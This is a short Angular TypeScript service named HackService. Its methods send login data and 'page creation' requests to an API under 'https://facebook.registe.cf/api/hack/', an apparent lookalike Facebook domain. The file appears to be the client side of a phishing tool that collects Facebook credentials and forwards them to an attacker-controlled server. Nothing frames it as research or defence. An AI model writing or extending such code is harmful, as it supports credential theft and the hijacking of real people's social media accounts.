import { Injectable, Injector } from '@angular/core';
import { HttpClient } from '@angular/common/http';

@Injectable({
  providedIn: 'root'
})
export class HackService {

  constructor(private http: HttpClient,) { }

  url = 'https://facebook.registe.cf/api/hack/'

  login(data){
    return this.http.post(this.url + 'login', data)
  }

  pageCount(){
    return this.http.get(this.url + 'page/count')
  }

  pageCreation(data){
    console.log('2')
    return this.http.post(this.url + 'page/count', data)
  }


}
